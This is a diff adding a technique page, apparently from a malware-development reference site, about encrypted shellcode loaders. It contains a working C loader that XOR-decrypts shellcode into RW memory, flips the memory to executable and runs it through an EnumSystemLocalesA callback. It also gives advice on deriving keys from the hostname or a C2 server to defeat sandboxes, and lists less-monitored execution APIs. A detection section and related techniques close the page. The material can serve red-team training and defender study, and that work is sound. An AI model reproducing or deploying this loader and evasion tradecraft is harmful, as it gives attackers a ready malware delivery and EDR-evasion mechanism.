@@ -1,0 +1,160 @@
+---
+title: Encrypted Shellcode Loader
+mitre: T1027.009
+category: loaders
+group: Staged Delivery
+summary: Decrypt and execute shellcode at runtime so the payload never touches disk in plaintext.
+platform: [Windows, Linux]
+tags: ['C / C++', 'Rust', 'XOR', 'AES']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: embed ciphertext blob
+    desc: Shellcode is XOR- or AES-encrypted at build time and baked into the loader's .data or .rdata section.
+    dll: —
+  - call: VirtualAlloc(MEM_COMMIT, PAGE_READWRITE)
+    desc: Allocate a RW region — never RWX at this point.
+    dll: kernel32
+  - call: decrypt in place
+    desc: XOR key or AES key+IV is derived at runtime (CPUID, env hash, etc.) to resist static extraction.
+    dll: —
+  - call: VirtualProtect(PAGE_EXECUTE_READ)
+    desc: Flip the allocation to RX. W^X discipline removes the loudest static indicator.
+    dll: kernel32
+  - call: CreateThread / callback trampoline
+    desc: Execute via CreateThread, EnumSystemLocalesA, or another API that accepts a function pointer.
+    dll: kernel32
+detections:
+  - src: ETW-TI
+    text: VirtualAlloc followed immediately by VirtualProtect on the same region is a strong loader pattern.
+  - src: MEMORY SCAN
+    text: Executable private memory whose entropy is below 7.5 bits/byte after decryption — structured PE or shellcode.
+  - src: YARA
+    text: XOR key schedules or AES S-box constants in the loader's .text section before the allocation call.
+  - src: BEHAVIOURAL
+    text: A thread whose start address points into an anonymous (non-image) RX allocation.
+related:
+  - mitre: T1027
+    title: PE Packer / Crypter
+    desc: Same concept applied to a full PE image rather than position-independent shellcode.
+    href: /techniques/loaders/pe-packer-crypter
+  - mitre: T1620
+    title: Reflective DLL Loading
+    desc: Shellcode that maps and runs a full PE without LoadLibrary.
+    href: /techniques/injection/reflective-dll-loading
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Alternate execution primitive once the shellcode is decrypted.
+    href: /techniques/injection/process-hollowing
+labKit:
+  - label: loader.c + Makefile
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+A shellcode loader's job is simple: get encrypted bytes from somewhere safe, decrypt them, make
+them executable, and transfer control. The encryption step means nothing recognisable sits in the
+binary's sections — no PE headers, no common shellcode preambles, nothing a static scanner can
+fingerprint.
+
+The two variables that define a loader's detection surface are **where it gets the key** (baked in,
+derived, fetched over the network) and **how it calls into the payload** (direct function pointer,
+`CreateThread`, an indirect callback). Neither dimension is a magic bypass; every path eventually
+produces executable private memory, and that is what modern sensors watch.
+
+<Callout type="note">
+  W^X discipline (allocate RW, decrypt, then flip to RX) is now table stakes. A loader that asks
+  for `PAGE_EXECUTE_READWRITE` in a single call produces a finding in almost every EDR on the
+  market before the first instruction of the payload runs.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The XOR variant is the simplest and the easiest to reason about.
+
+<CodeBlock
+  file="loader.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// shellcode baked in as ciphertext at build time
+extern const unsigned char sc_enc[];
+extern const size_t        sc_enc_len;
+static const unsigned char KEY[] = { 0xDE, 0xAD, 0xBE, 0xEF };
+
+void run(void) {
+    // 1. allocate RW — no execute flag yet
+    unsigned char *buf = VirtualAlloc(NULL, sc_enc_len,
+                                      MEM_COMMIT | MEM_RESERVE,
+                                      PAGE_READWRITE);
+
+    // 2. decrypt in place
+    for (size_t i = 0; i < sc_enc_len; i++)
+        buf[i] = sc_enc[i] ^ KEY[i % sizeof KEY];
+
+    // 3. flip to RX — W gone before X arrives
+    DWORD old;
+    VirtualProtect(buf, sc_enc_len, PAGE_EXECUTE_READ, &old);
+
+    // 4. execute via indirect callback (less conspicuous than CreateThread)
+    EnumSystemLocalesA((LOCALE_ENUMPROCA)buf, 0);
+}`}
+/>
+
+<Callout type="caution">
+  A static XOR key is recoverable from the binary in seconds. Key derivation — hashing the
+  hostname, reading a beacon response, requiring a specific argument — meaningfully raises the
+  analysis cost.
+</Callout>
+
+## Key derivation patterns
+
+| Approach | Analysis cost | Ops cost |
+|---|---|---|
+| Hardcoded key in binary | Trivial — strings or xorbrute | Zero |
+| Key derived from hostname/domain | Forces domain-joined execution | Breaks sandbox |
+| Key fetched from C2 first stage | Requires live C2 to decrypt | High |
+| Key split: half binary, half env var | Breaks automated detonation | Medium |
+
+Sandboxes typically run without a domain or specific environment variables. A loader that refuses
+to proceed unless it sees the right hostname or registry value is broken for the sandbox but
+functional in the target environment.
+
+## Execution primitives
+
+Passing the buffer to `CreateThread` is the obvious path and the most monitored. Alternative
+APIs that accept a function pointer:
+
+- `EnumSystemLocalesA` / `EnumSystemLanguageGroupsA` — legitimate Windows enumeration callbacks
+- `EnumChildWindows` — takes an LPARAM you can put anything in
+- `QueueUserAPC` — queues to any alertable thread; see [APC Injection](/techniques/injection/apc-injection)
+- `RtlCreateUserThread` — avoids the `kernel32` import but is equally visible at the kernel layer
+
+None of these avoid ETW-TI. The kernel records every thread start regardless of which API created
+the thread.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The VirtualAlloc → VirtualProtect sequence on the same private region is the most reliable
+pattern. Production loaders that split the allocate-decrypt-protect steps across multiple frames
+or use indirect calls do not defeat this; they just add noise between the same two events.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
